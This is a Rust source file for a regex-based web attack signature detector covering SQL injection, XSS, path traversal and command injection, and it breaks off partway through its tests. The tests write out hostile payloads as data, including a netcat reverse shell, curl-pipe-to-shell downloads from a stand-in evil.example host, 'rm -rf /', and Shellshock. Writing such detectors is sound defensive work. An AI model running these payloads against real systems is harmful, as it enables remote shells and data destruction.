//! Signature-Based Detection
//!
//! 既知の攻撃パターンをマッチングして検知します。

use super::{DetectionType, RequestData, Severity};
use crate::error::McpError;
use regex::Regex;
use serde::{Deserialize, Serialize};
use tracing::{debug, warn};

/// シェルのコマンドの引数らしいもの（#759）。`-`・`/`・`~`・`.`・`$`・
/// 引用符・`http(s)://`・`C:\`で始まるもの、数（`kill 1234`）、拡張子の
/// あるファイル名（`rm victim.txt`、PR #764のレビュー）
const SHELL_ARGUMENT: &str = r#"(?:[-/~.$'"]|https?://|[a-z]:\\|\d+\b|[\w-]+\.\w)"#;

/// シェルのコマンド名の後に続くもの（#759）。終わり・区切り（`;`・`&`・
/// `<`・`>`・バッククォート）・閉じ括弧・引用符か、空白と引数らしいもの
/// （[`SHELL_ARGUMENT`]）。英語の文の`; cat lovers`、Markdownの表の
/// `| id |`のように、普通の語や`|`が続くものは一致しない
fn shell_command_tail() -> String {
    format!(r#"(?:\s*$|\s*[;&<>`)'"]|\s+{SHELL_ARGUMENT})"#)
}

/// CMD-001等で見るシェルのコマンド名（#759）
const SHELL_COMMANDS: &str = "rm|curl|wget|nc|ncat|netcat|telnet|bash|sh|zsh|ksh|dash|cat|\
     chmod|chown|kill|python[23]?|perl|ruby|php|powershell|pwsh|cmd|id|whoami|uname|ls|ping|nslookup";

/// シェルのコマンドの前に付くパス（`/bin/`・`/usr/sbin/`等）
const SHELL_COMMAND_DIR: &str = r"/(?:usr/)?s?bin/";

/// CMD-001の正規表現（#759）。区切り（`;`・`&`・`|`・改行）の後の
/// シェルのコマンド（`/bin/`等のパスを付けたものも）に、
/// [`shell_command_tail`]が続くものと、Shellshock（`() { :; };`）。
/// バッククォートはCMD-002で見る（Markdownの`` `id` ``に当てない）
fn shell_command_injection_pattern() -> String {
    format!(
        r"(?i)(?:[;&|\n]\s*(?:{SHELL_COMMAND_DIR})?(?:{SHELL_COMMANDS}){tail}|\(\)\s*\{{\s*:\s*;\s*\}}\s*;)",
        tail = shell_command_tail()
    )
}

/// CMD-002の正規表現（#759）。バッククォートの中が、シェルのコマンドに
/// 引数らしいもの（[`SHELL_ARGUMENT`]）が続くもの、パスを付けたコマンド
/// （`` `/bin/id` ``）、`whoami`・`uname`だけのもの、値に続けたコマンド
/// だけのもの（`` name=`id` ``）。以前は`` `[\w\s]+` ``で、Markdownの
/// コード（`` `id` ``・`` `foo bar` ``）にも当たった
fn backtick_command_pattern() -> String {
    format!(
        r"(?i)(?:`\s*(?:(?:{SHELL_COMMAND_DIR})?(?:{SHELL_COMMANDS})\s+{SHELL_ARGUMENT}[^`]*|{SHELL_COMMAND_DIR}(?:{SHELL_COMMANDS})|whoami|uname)\s*`|[\w=]`\s*(?:{SHELL_COMMANDS})\s*`)"
    )
}

/// CMD-003の正規表現（#759）。`$(`の中がシェルのコマンド（パスを付けた
/// ものも）で、その後が空白・`)`・シェルの演算子（`<`・`>`・`|`・`;`・
/// `&`。`$(id>/tmp/x)`、PR #764のレビュー）のもの。以前は`\$\([^)]+\)`で、
/// jQueryの`$(document)`・`$('.x')`にも当たった
fn dollar_paren_command_pattern() -> String {
    format!(r"(?i)\$\(\s*(?:{SHELL_COMMAND_DIR})?(?:{SHELL_COMMANDS})(?:\s|[)<>|;&])")
}

/// シグネチャ検知器
pub struct SignatureDetector {
    /// 攻撃パターンデータベース
    patterns: Vec<AttackPattern>,
    /// カスタムルール
    custom_rules: Vec<CustomRule>,
}

/// 攻撃パターン
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AttackPattern {
    /// パターンID
    pub id: String,
    /// パターン名
    pub name: String,
    /// 検知タイプ
    pub detection_type: DetectionType,
    /// 正規表現パターン
    pub regex_pattern: String,
    /// コンパイル済み正規表現（シリアライズ不可）
    #[serde(skip)]
    pub compiled_regex: Option<Regex>,
    /// 深刻度
    pub severity: Severity,
    /// 説明
    pub description: String,
    /// CVE ID
    pub cve_ids: Vec<String>,
    /// 有効/無効
    pub enabled: bool,
}

/// カスタムルール
#[derive(Debug, Clone)]
pub struct CustomRule {
    /// ルールID
    pub id: String,
    /// ルール名
    pub name: String,
    /// マッチング関数
    pub matcher: fn(&RequestData) -> bool,
    /// 検知タイプ
    pub detection_type: DetectionType,
    /// 深刻度
    pub severity: Severity,
}

/// 検知結果
#[derive(Debug, Clone)]
pub struct SignatureDetectionResult {
    /// マッチフラグ
    pub matched: bool,
    /// 信頼度
    pub confidence: f64,
    /// 検知タイプ
    pub detection_type: DetectionType,
    /// マッチしたパターン名
    pub pattern_names: Vec<String>,
    /// 深刻度
    pub severity: Severity,
}

impl SignatureDetector {
    /// 新しいシグネチャ検知器を作成
    pub async fn new() -> Result<Self, McpError> {
        let patterns = Self::load_default_patterns()?;

        Ok(Self {
            patterns,
            custom_rules: Vec::new(),
        })
    }

    /// デフォルトパターンをロード（50+パターン）
    fn load_default_patterns() -> Result<Vec<AttackPattern>, McpError> {
        let mut patterns = Vec::new();

        // SQL Injection パターン (15パターン)
        patterns.extend(vec![
            AttackPattern::new(
                "SQL-001",
                "UNION SELECT Attack",
                DetectionType::SqlInjection,
                r"(?i)union\s+(all\s+)?select",
                Severity::Critical,
                "UNION-based SQL injection attempt",
                vec!["CVE-2019-0708"],
            )?,
            AttackPattern::new(
                "SQL-002",
                "Boolean-based Blind SQL Injection",
                DetectionType::SqlInjection,
                r"(?i)('|\s+)(and|or)('|\s+)('.+'='.+|\d+\s*=\s*\d+)",
                Severity::High,
                "Boolean-based blind SQL injection",
                vec![],
            )?,
            AttackPattern::new(
                "SQL-003",
                "Time-based Blind SQL Injection",
                DetectionType::SqlInjection,
                r"(?i)(sleep|benchmark|waitfor)\s*\(",
                Severity::High,
                "Time-based blind SQL injection",
                vec![],
            )?,
            AttackPattern::new(
                "SQL-004",
                "Comment Injection",
                DetectionType::SqlInjection,
                r"(/\*|\*/|--|#|;%00)",
                Severity::Medium,
                "SQL comment injection",
                vec![],
            )?,
            AttackPattern::new(
                "SQL-005",
                "Information Schema Access",
                DetectionType::SqlInjection,
                r"(?i)information_schema",
                Severity::High,
                "Access to information_schema",
                vec![],
            )?,
            AttackPattern::new(
                "SQL-006",
                "SQL Stacked Queries",
                DetectionType::SqlInjection,
                r";\s*(drop|delete|update|insert)\s+",
                Severity::Critical,
                "SQL stacked queries attack",
                vec![],
            )?,
            AttackPattern::new(
                "SQL-007",
                "SQL Hex Encoding",
                DetectionType::SqlInjection,
                r"0x[0-9a-fA-F]{2,}",
                Severity::Medium,
                "SQL hex encoding obfuscation",
                vec![],
            )?,
            AttackPattern::new(
                "SQL-008",
                "SQL Char Function",
                DetectionType::SqlInjection,
                r"(?i)char\s*\(\s*\d+",
                Severity::Medium,
                "SQL CHAR function obfuscation",
                vec![],
            )?,
            AttackPattern::new(
                "SQL-009",
                "SQL Concat Function",
                DetectionType::SqlInjection,
                r"(?i)concat\s*\(",
                Severity::Low,
                "SQL CONCAT function usage",
                vec![],
            )?,
            AttackPattern::new(
                "SQL-010",
                "SQL Load File",
                DetectionType::SqlInjection,
                r"(?i)load_file\s*\(",
                Severity::Critical,
                "SQL LOAD_FILE attempt",
                vec![],
            )?,
            AttackPattern::new(
                "SQL-011",
                "SQL Into Outfile",
                DetectionType::SqlInjection,
                r"(?i)into\s+(out|dump)file",
                Severity::Critical,
                "SQL INTO OUTFILE attempt",
                vec![],
            )?,
            AttackPattern::new(
                "SQL-012",
                "SQL Database Names",
                DetectionType::SqlInjection,
                r"(?i)(mysql|mssql|postgres|oracle)\.(sys|user|dbo)",
                Severity::High,
                "SQL database system access",
                vec![],
            )?,
            AttackPattern::new(
                "SQL-013",
                "SQL Execute Command",
                DetectionType::SqlInjection,
                r"(?i)(exec|execute)\s+(sp_|xp_)",
                Severity::Critical,
                "SQL stored procedure execution",
                vec![],
            )?,
            AttackPattern::new(
                "SQL-014",
                "SQL Truncate",
                DetectionType::SqlInjection,
                r"(?i)truncate\s+table",
                Severity::Critical,
                "SQL TRUNCATE TABLE attempt",
                vec![],
            )?,
            AttackPattern::new(
                "SQL-015",
                "SQL Alter Table",
                DetectionType::SqlInjection,
                r"(?i)alter\s+table",
                Severity::Critical,
                "SQL ALTER TABLE attempt",
                vec![],
            )?,
        ]);

        // XSS パターン (15パターン)
        patterns.extend(vec![
            AttackPattern::new(
                "XSS-001",
                "Script Tag Injection",
                DetectionType::XssAttack,
                r"<script[^>]*>",
                Severity::High,
                "XSS script tag injection",
                vec![],
            )?,
            AttackPattern::new(
                "XSS-002",
                "JavaScript Event Handler",
                DetectionType::XssAttack,
                r"(?i)on(load|error|click|mouseover)\s*=",
                Severity::High,
                "XSS via event handler",
                vec![],
            )?,
            AttackPattern::new(
                "XSS-003",
                "JavaScript Protocol",
                DetectionType::XssAttack,
                r"javascript\s*:",
                Severity::High,
                "XSS via javascript: protocol",
                vec![],
            )?,
            AttackPattern::new(
                "XSS-004",
                "Data URI Scheme",
                DetectionType::XssAttack,
                r"data\s*:\s*text/html",
                Severity::Medium,
                "XSS via data URI",
                vec![],
            )?,
            AttackPattern::new(
                "XSS-005",
                "Iframe Injection",
                DetectionType::XssAttack,
                r"<iframe[^>]*>",
                Severity::High,
                "Iframe injection attack",
                vec![],
            )?,
            AttackPattern::new(
                "XSS-006",
                "Object Tag Injection",
                DetectionType::XssAttack,
                r"<object[^>]*>",
                Severity::Medium,
                "Object tag injection",
                vec![],
            )?,
            AttackPattern::new(
                "XSS-007",
                "Embed Tag Injection",
                DetectionType::XssAttack,
                r"<embed[^>]*>",
                Severity::Medium,
                "Embed tag injection",
                vec![],
            )?,
            AttackPattern::new(
                "XSS-008",
                "SVG Script Injection",
                DetectionType::XssAttack,
                r"<svg[^>]*>.*<script",
                Severity::High,
                "SVG-based XSS",
                vec![],
            )?,
            AttackPattern::new(
                "XSS-009",
                "Style Expression",
                DetectionType::XssAttack,
                r"(?i)expression\s*\(",
                Severity::Medium,
                "CSS expression XSS",
                vec![],
            )?,
            AttackPattern::new(
                "XSS-010",
                "Import Stylesheet",
                DetectionType::XssAttack,
                r"@import",
                Severity::Low,
                "CSS import injection",
                vec![],
            )?,
            // `base64`という語だけでは判定しない（#759。本文の
            // `"encoding":"base64"`や画像の`data:image/png;base64,`は普通に
            // 使う）。スクリプト・HTMLとして実行される種類の`data:` URIを
            // base64で埋め込んだものだけを見る。種類と`;base64,`の間の
            // パラメーター（`charset=utf-8`・`foo=bar`等）は、いくつあっても
            // よい（PR #764のレビュー）。JavaScriptの種類は、WHATWGのMIME
            // Sniffingの別名（`text/x-javascript`・`text/javascript1.0`〜`1.5`・
            // `text/jscript`・`text/livescript`等）も含める
            AttackPattern::new(
                "XSS-011",
                "Base64 Encoded Script",
                DetectionType::XssAttack,
                r#"(?i)data\s*:\s*(?:text/(?:html|xml|(?:x-)?(?:javascript|ecmascript)|javascript1\.[0-5]|jscript|livescript)|application/(?:x-)?(?:javascript|ecmascript|xhtml\+xml)|image/svg\+xml)\s*;\s*(?:[\w.+-]+\s*=\s*(?:"[^"]*"|[^;,"\s]*)\s*;\s*)*base64\s*,"#,
                Severity::High,
                "Base64 encoded XSS",
                vec![],
            )?,
            AttackPattern::new(
                "XSS-012",
                "Meta Redirect",
                DetectionType::XssAttack,
                r"<meta[^>]*http-equiv",
                Severity::Medium,
                "Meta redirect attack",
                vec![],
            )?,
            AttackPattern::new(
                "XSS-013",
                "Link Stylesheet Injection",
                DetectionType::XssAttack,
                r"<link[^>]*stylesheet",
                Severity::Low,
                "Link stylesheet injection",
                vec![],
            )?,
            AttackPattern::new(
                "XSS-014",
                "Vbscript Protocol",
                DetectionType::XssAttack,
                r"vbscript:",
                Severity::High,
                "VBScript protocol XSS",
                vec![],
            )?,
            AttackPattern::new(
                "XSS-015",
                "HTML Entity Obfuscation",
                DetectionType::XssAttack,
                r"&#x?[0-9a-fA-F]{2,};.*<script",
                Severity::Medium,
                "HTML entity obfuscated XSS",
                vec![],
            )?,
        ]);

        // Path Traversal パターン (10パターン)
        patterns.extend(vec![
            AttackPattern::new(
                "PATH-001",
                "Directory Traversal",
                DetectionType::UnauthorizedAccess,
                r"(\.\./|\.\.\\)",
                Severity::High,
                "Directory traversal attempt",
                vec![],
            )?,
            AttackPattern::new(
                "PATH-002",
                "Absolute Path Access",
                DetectionType::UnauthorizedAccess,
                r"(/etc/(passwd|shadow)|C:\\Windows\\System32)",
                Severity::Critical,
                "Absolute path access attempt",
                vec![],
            )?,
            AttackPattern::new(
                "PATH-003",
                "Null Byte Injection",
                DetectionType::UnauthorizedAccess,
                r"%00",
                Severity::High,
                "Null byte injection",
                vec![],
            )?,
            AttackPattern::new(
                "PATH-004",
                "URL Encoded Traversal",
                DetectionType::UnauthorizedAccess,
                r"(%2e%2e|%252e)",
                Severity::High,
                "URL encoded directory traversal",
                vec![],
            )?,
            AttackPattern::new(
                "PATH-005",
                "Double Encoding",
                DetectionType::UnauthorizedAccess,
                r"%25(2e|5c|2f)",
                Severity::Medium,
                "Double URL encoding obfuscation",
                vec![],
            )?,
            AttackPattern::new(
                "PATH-006",
                "Unicode Encoding",
                DetectionType::UnauthorizedAccess,
                r"(%u002e|%uff0e)",
                Severity::Medium,
                "Unicode encoding obfuscation",
                vec![],
            )?,
            AttackPattern::new(
                "PATH-007",
                "Windows UNC Path",
                DetectionType::UnauthorizedAccess,
                r"(\\\\[a-zA-Z0-9_.-]+\\)",
                Severity::High,
                "Windows UNC path access",
                vec![],
            )?,
            // パスの中のファイル名だけ（#759。以前は`.initial`・`.conference`
            // 等の語にも当たった）。始まり・`/`・`\`・`=`の後の名前が
            // `.env`等で終わり、その後が終わり・区切り・`.`のものと、引用符で
            // 囲んだ値の全体がそのファイル名のもの（JSONの`{"file":".env"}`、
            // PR #764のレビュー。文の`"edit web.config to ..."`は当てない）。
            // 値の始めの名前は、後ろが終わり・区切り・`.`のときだけ（JSONの値を
            // デコードして調べるので、`"web.config tips"`のような文に当てない）。
            // `/`・`\`の後の名前は空白を含んでもよい（`/app/my config.ini`、
            // PR #764のレビュー）が、そのときは後ろが終わり・区切り・引用符の
            // ときだけ（文の`docs/notes about web.config tips`に当てない）。
            // 名前は引用符・`,`・`:`・`?`・`#`・`&`・`;`を含まない（JSONの
            // 本文のままで、値の境目を越えて`/example.com","text":"edit
            // web.config"`のように当てない。PR #764のレビュー）
            AttackPattern::new(
                "PATH-008",
                "Config File Access",
                DetectionType::UnauthorizedAccess,
                r#"(?i)^[\w.-]*\.(?:env|config|ini|conf)(?:$|[/\\?#&;.])|[/\\=][\w.-]*\.(?:env|config|ini|conf)(?:$|[/\\?#&;.'"\s])|[/\\][^/\\\r\n"',:?#&;]*\.(?:env|config|ini|conf)(?:$|[/\\?#&;'"])|"[\w.-]*\.(?:env|config|ini|conf)"|'[\w.-]*\.(?:env|config|ini|conf)'"#,
                Severity::High,
                "Configuration file access",
                vec![],
            )?,
            AttackPattern::new(
                "PATH-009",
                "Backup File Access",
                DetectionType::UnauthorizedAccess,
                r"\.(bak|backup|old|~)$",
                Severity::Medium,
                "Backup file access attempt",
                vec![],
            )?,
            AttackPattern::new(
                "PATH-010",
                "Source Code Access",
                DetectionType::UnauthorizedAccess,
                r"\.(php|asp|aspx|jsp|java)\.txt$",
                Severity::Medium,
                "Source code disclosure attempt",
                vec![],
            )?,
        ]);

        // Command Injection パターン (10パターン)
        patterns.extend(vec![
            // 記号だけでは判定しない（#759。`Cookie: a=b; c=d`、ブラウザの
            // User-Agentの`;`、本文の`&`・`<`で、普通の要求を断っていた）。
            // コマンドの区切り（`;`・`&`・`|`・改行）の後にシェルのコマンドが
            // 続き、その後が終わり・区切り・引数（`-`・`/`等で始まるもの）の
            // ときと、Shellshock（`() { :; };`）だけを見る
            AttackPattern::new(
                "CMD-001",
                "Shell Command Injection",
                DetectionType::Other,
                &shell_command_injection_pattern(),
                Severity::Critical,
                "Shell command injection",
                vec![],
            )?,
            // CMD-002・003も、中がシェルのコマンドのときだけ（#759）
            AttackPattern::new(
                "CMD-002",
                "Backtick Command",
                DetectionType::Other,
                &backtick_command_pattern(),
                Severity::Critical,
                "Backtick command execution",
                vec![],
            )?,
            AttackPattern::new(
                "CMD-003",
                "Dollar Parenthesis",
                DetectionType::Other,
                &dollar_paren_command_pattern(),
                Severity::Critical,
                "Dollar parenthesis command",
                vec![],
            )?,
            // CMD-004・005も、コマンド名の後に引数らしいもの等が続くときだけ
            // （#759。`| identity`、Markdownの表の`| id |`、`; delivery`・
            // `; format: json`で、普通の要求を断っていた）
            AttackPattern::new(
                "CMD-004",
                "Pipe Command",
                DetectionType::Other,
                &format!(r"(?i)\|\s*(?:cat|ls|pwd|whoami|id){}", shell_command_tail()),
                Severity::High,
                "Piped command execution",
                vec![],
            )?,
            AttackPattern::new(
                "CMD-005",
                "Semicolon Command",
                DetectionType::Other,
                // `rm`は、普通の語の引数（`x;rm victim`）も見る（#774）。
                // 小文字だけ（`; RM Williams`等の文に当てない）。`del`等は
                // 英語以外の文（`; del Toro`）に出るので、今までどおり
                &format!(
                    r"(?i);\s*(?:(?-i:rm)\s+[\w./-]+|(?:rm|del|format|kill){})",
                    shell_command_tail()
                ),
                Severity::Critical,
                "Semicolon command chaining",
                vec![],
            )?,
            AttackPattern::new(
                "CMD-006",
                "Ampersand Command",
                DetectionType::Other,
                r"&&\s*(wget|curl|nc|netcat)\b",
                Severity::Critical,
                "Ampersand command chaining",
                vec![],
            )?,
            AttackPattern::new(
                "CMD-007",
                "Redirection Attack",
                DetectionType::Other,
                r">\s*/dev/",
                Severity::Medium,
                "Output redirection",
                vec![],
            )?,
            AttackPattern::new(
                "CMD-008",
                "Eval Function",
                DetectionType::Other,
                r"(?i)eval\s*\(",
                Severity::High,
                "Eval function usage",
                vec![],
            )?,
            AttackPattern::new(
                "CMD-009",
                "System Function",
                DetectionType::Other,
                r"(?i)system\s*\(",
                Severity::Critical,
                "System function call",
                vec![],
            )?,
            AttackPattern::new(
                "CMD-010",
                "Exec Function",
                DetectionType::Other,
                r"(?i)exec\s*\(",
                Severity::Critical,
                "Exec function call",
                vec![],
            )?,
        ]);

        Ok(patterns)
    }

    /// リクエストを検知
    pub async fn detect(
        &self,
        request: &RequestData,
    ) -> Result<SignatureDetectionResult, McpError> {
        debug!(
            "Running signature detection on request: {}",
            request.request_id
        );

        let mut matched_patterns = Vec::new();
        let mut max_severity = Severity::Low;
        // 最初に一致したルール（組み込み、次にカスタムの順）の検知タイプ。
        // 名前で引き直すと、カスタムルールだけの一致は`Other`に、組み込みと
        // 名前が重なれば一致していない組み込みの型になった（#760）
        let mut detection_type = None;

        // リクエスト全体を検査対象文字列に変換
        let check_strings = self.extract_check_strings(request);

        // 全パターンをチェック
        for pattern in &self.patterns {
            if !pattern.enabled {
                continue;
            }

            if let Some(regex) = &pattern.compiled_regex {
                for check_str in &check_strings {
                    if regex.is_match(check_str) {
                        matched_patterns.push(pattern.name.clone());
                        max_severity = max_severity.max(pattern.severity);
                        detection_type.get_or_insert(pattern.detection_type);

                        warn!(
                            "Attack pattern matched: {} ({}), severity: {:?}",
                            pattern.name, pattern.id, pattern.severity
                        );
                        break;
                    }
                }
            }
        }

        // カスタムルールをチェック
        for rule in &self.custom_rules {
            if (rule.matcher)(request) {
                matched_patterns.push(rule.name.clone());
                max_severity = max_severity.max(rule.severity);
                detection_type.get_or_insert(rule.detection_type);
            }
        }

        let matched = !matched_patterns.is_empty();
        let confidence = if matched {
            match max_severity {
                Severity::Critical => 0.95,
                Severity::High => 0.85,
                Severity::Medium => 0.70,
                Severity::Low => 0.50,
            }
        } else {
            0.0
        };

        Ok(SignatureDetectionResult {
            matched,
            confidence,
            detection_type: detection_type.unwrap_or(DetectionType::Other),
            pattern_names: matched_patterns,
            severity: max_severity,
        })
    }

    /// カスタムルールを追加
    pub fn add_custom_rule(&mut self, rule: CustomRule) {
        self.custom_rules.push(rule);
    }

    /// 検査対象文字列を抽出
    fn extract_check_strings(&self, request: &RequestData) -> Vec<String> {
        let mut strings = Vec::new();

        // URL パス
        strings.push(request.path.clone());

        // クエリパラメータ。同じ名前の値も、1つずつ調べる（PR #764の
        // レビュー。`, `でつなぐと、`x;id, benign`のように、値の終わりを
        // 見るパターンが当たらなかった）
        for (key, values) in &request.query_params {
            for value in values {
                strings.push(format!("{}={}", key, value));
                strings.push(value.clone());
            }
        }

        // ヘッダー
        for (key, value) in &request.headers {
            let key_lower = key.to_lowercase();
            if key_lower.contains("cookie")
                || key_lower.contains("referer")
                || key_lower.contains("user")
            {
                strings.push(value.clone());
            }
        }

        // ボディ。JSONなら、デコードした文字列の値も1つずつ調べる（PR #764の
        // レビュー。本文のままでは`\"`等のエスケープが残り、値の形を見る
        // パターンが当たらない）
        if let Some(body) = &request.body {
            if let Ok(body_str) = String::from_utf8(body.clone()) {
                if let Ok(json) = serde_json::from_str::<serde_json::Value>(&body_str) {
                    collect_json_strings(&json, &mut strings);
                }
                strings.push(body_str);
            }
        }

        strings
    }
}

/// JSONの文字列の値を、デコードして`out`に足す（キーは足さない。PR #764の
/// レビュー）。本文の大きさはHTTP層で制限されているので、数は本文の長さを
/// 超えない
fn collect_json_strings(value: &serde_json::Value, out: &mut Vec<String>) {
    match value {
        serde_json::Value::String(text) => out.push(text.clone()),
        serde_json::Value::Array(items) => {
            for item in items {
                collect_json_strings(item, out);
            }
        }
        serde_json::Value::Object(map) => {
            for item in map.values() {
                collect_json_strings(item, out);
            }
        }
        _ => {}
    }
}

impl AttackPattern {
    /// 新しい攻撃パターンを作成
    pub fn new(
        id: &str,
        name: &str,
        detection_type: DetectionType,
        regex_pattern: &str,
        severity: Severity,
        description: &str,
        cve_ids: Vec<&str>,
    ) -> Result<Self, McpError> {
        let compiled_regex = Regex::new(regex_pattern)
            .map_err(|e| McpError::Config(format!("Invalid regex pattern: {}", e)))?;

        Ok(Self {
            id: id.to_string(),
            name: name.to_string(),
            detection_type,
            regex_pattern: regex_pattern.to_string(),
            compiled_regex: Some(compiled_regex),
            severity,
            description: description.to_string(),
            cve_ids: cve_ids.iter().map(|s| s.to_string()).collect(),
            enabled: true,
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use chrono::Utc;
    use std::collections::HashMap;

    #[tokio::test]
    async fn test_signature_detector_initialization() {
        let detector = SignatureDetector::new().await;
        assert!(detector.is_ok());

        let detector = detector.unwrap();
        assert!(detector.patterns.len() >= 50);
    }

    #[tokio::test]
    async fn test_sql_injection_detection() {
        let detector = SignatureDetector::new().await.unwrap();

        let mut query_params = HashMap::new();
        query_params.insert(
            "id".to_string(),
            vec!["1 UNION SELECT FROM users".to_string()],
        );

        let request = RequestData {
            request_id: "test-001".to_string(),
            method: "GET".to_string(),
            path: "/api/users".to_string(),
            query_params,
            headers: HashMap::new(),
            body: None,
            source_ip: None,
            caller_id: None,
            timestamp: Utc::now(),
        };

        let result = detector.detect(&request).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.detection_type, DetectionType::SqlInjection);
        assert!(result.confidence > 0.8);
    }

    #[tokio::test]
    async fn test_xss_detection() {
        let detector = SignatureDetector::new().await.unwrap();

        let request = RequestData {
            request_id: "test-002".to_string(),
            method: "POST".to_string(),
            path: "/api/comments".to_string(),
            query_params: HashMap::new(),
            headers: HashMap::new(),
            body: Some(b"<script>alert(XSS)</script>".to_vec()),
            source_ip: None,
            caller_id: None,
            timestamp: Utc::now(),
        };

        let result = detector.detect(&request).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.detection_type, DetectionType::XssAttack);
    }

    #[tokio::test]
    async fn test_benign_request() {
        let detector = SignatureDetector::new().await.unwrap();

        let mut query_params = HashMap::new();
        query_params.insert("category".to_string(), vec!["electronics".to_string()]);

        let request = RequestData {
            request_id: "test-003".to_string(),
            method: "GET".to_string(),
            path: "/api/products".to_string(),
            query_params,
            headers: HashMap::new(),
            body: None,
            source_ip: None,
            caller_id: None,
            timestamp: Utc::now(),
        };

        let result = detector.detect(&request).await.unwrap();
        assert!(!result.matched);
        assert_eq!(result.confidence, 0.0);
    }

    fn request_with(
        query: &[(&str, &str)],
        headers: &[(&str, &str)],
        body: Option<&str>,
    ) -> RequestData {
        RequestData {
            request_id: "test-759".to_string(),
            method: "POST".to_string(),
            path: "/mcp".to_string(),
            query_params: query.iter().fold(HashMap::new(), |mut map, (k, v)| {
                map.entry(k.to_string())
                    .or_insert_with(Vec::new)
                    .push(v.to_string());
                map
            }),
            headers: headers
                .iter()
                .map(|(k, v)| (k.to_string(), v.to_string()))
                .collect(),
            body: body.map(|b| b.as_bytes().to_vec()),
            source_ip: None,
            caller_id: None,
            timestamp: Utc::now(),
        }
    }

    /// ブラウザのUser-Agent・複数のCookie・`&`・`<`・`;`・`base64`を含む
    /// JSONの本文は、どのパターンにも当たらない（#759。以前はCMD-001
    /// （Critical）・XSS-011（High）に当たり、HTTP 403になった）
    #[tokio::test]
    async fn test_ordinary_headers_and_bodies_are_not_attacks() {
        let detector = SignatureDetector::new().await.unwrap();
        let user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        ];
        let cookies = [
            "a=b; c=d",
            "theme=dark; locale=ja; id=42; sh=1",
            "session=abc123; cat=books; ls=1",
        ];
        let bodies = [
            r#"{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"upload_media","arguments":{"encoding":"base64","data":"iVBORw0KGgo=","mime_type":"image/png"}}}"#,
            r#"{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"create_post","arguments":{"title":"Q&A; tips & tricks","content":"<p>R&amp;D: a < b; c > d</p>"}}}"#,
            r#"{"content":"<img src=\"data:image/png;base64,iVBORw0KGgo=\">"}"#,
            r#"{"content":"| id | name |\n| 1 | cat |","note":"price; delivery in 3 days; format: json"}"#,
            r#"{"content":"I like dogs; cat lovers disagree | identity & ls of things"}"#,
        ];
        for ua in user_agents {
            for cookie in cookies {
                let request = request_with(&[], &[("User-Agent", ua), ("Cookie", cookie)], None);
                let result = detector.detect(&request).await.unwrap();
                assert!(
                    !result.matched,
                    "{ua} / {cookie}: {:?}",
                    result.pattern_names
                );
            }
        }
        for body in bodies {
            let result = detector
                .detect(&request_with(&[], &[], Some(body)))
                .await
                .unwrap();
            assert!(!result.matched, "{body}: {:?}", result.pattern_names);
        }
    }

    /// コマンドの実行を示すものは、引き続きCMD-001等で検知する（#759）
    #[tokio::test]
    async fn test_shell_command_injection_is_still_detected() {
        let detector = SignatureDetector::new().await.unwrap();
        let payloads = [
            "x; id",
            "x;id\"",
            "x; cat /etc/hosts",
            "a | sh",
            "a|bash -i",
            "foo && curl http://evil.example/x",
            "foo & wget https://evil.example/x",
            "x; /bin/sh -c 'uname -a'",
            "x\nwhoami",
            "x; nc -e /bin/sh 192.0.2.1 4444",
            "ls; rm -rf /",
            "x; python3 -c 'print(1)'",
            "x | id",
        ];
        for payload in payloads {
            let result = detector
                .detect(&request_with(&[("q", payload)], &[], None))
                .await
                .unwrap();
            assert!(result.matched, "{payload}");
            assert!(
                result.severity >= Severity::High,
                "{payload}: {:?}",
                result.severity
            );
        }
        // Shellshock（User-Agent）
        let result = detector
            .detect(&request_with(
                &[],
                &[("User-Agent", "() { :; }; echo vulnerable")],
                None,
            ))
            .await
            .unwrap();
        assert!(
            result
                .pattern_names
                .contains(&"Shell Command Injection".to_string()),
            "{:?}",
            result.pattern_names
        );
        // Cookieの値の中のコマンド
        let result = detector
            .detect(&request_with(
                &[],
                &[("Cookie", "a=b; c=d; e=x;curl http://evil.example|sh")],
                None,
            ))
            .await
            .unwrap();
        assert_eq!(
            result.severity,
            Severity::Critical,
            "{:?}",
            result.pattern_names
        );
    }

    /// XSS-011は、スクリプト・HTMLとして実行される種類の`data:` URIの
    /// base64だけを検知する（#759）
    #[tokio::test]
    async fn test_base64_script_data_uri_is_still_detected() {
        let detector = SignatureDetector::new().await.unwrap();
        for body in [
            "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">x</a>",
            "<iframe src=DATA:text/html;charset=utf-8;base64,PHNjcmlwdD4=>",
            "<embed src=\"data:image/svg+xml;base64,PHN2Zz4=\">",
            "<script src=\"data:application/javascript;base64,YWxlcnQoMSk=\"></script>",
        ] {
            let result = detector
                .detect(&request_with(&[], &[], Some(body)))
                .await
                .unwrap();
            assert!(
                result
                    .pattern_names
                    .contains(&"Base64 Encoded Script".to_string()),
                "{body}: {:?}",
                result.pattern_names
            );
            assert_eq!(result.detection_type, DetectionType::XssAttack);
        }
    }

    /// XSS-011は、種類と`;base64,`の間のパラメーターがいくつあっても検知
    /// する。画像は、パラメーターがあっても当たらない（PR #764のレビュー）
    #[tokio::test]
    async fn test_base64_script_data_uri_with_parameters() {
        let detector = SignatureDetector::new().await.unwrap();
        for value in [
            "data:text/html;foo=bar;charset=utf-8;base64,PHNjcmlwdD4=",
            "data:text/html;name=\"a b\";base64,PHNjcmlwdD4=",
            "DATA:application/javascript ; x-y=1 ; z=2 ; base64,YWxlcnQoMSk=",
            // JavaScriptの種類の別名（PR #764のレビュー）
            "data:text/x-javascript;base64,YWxlcnQoMSk=",
            "data:text/javascript1.5;base64,YWxlcnQoMSk=",
            "data:text/jscript;charset=utf-8;base64,YWxlcnQoMSk=",
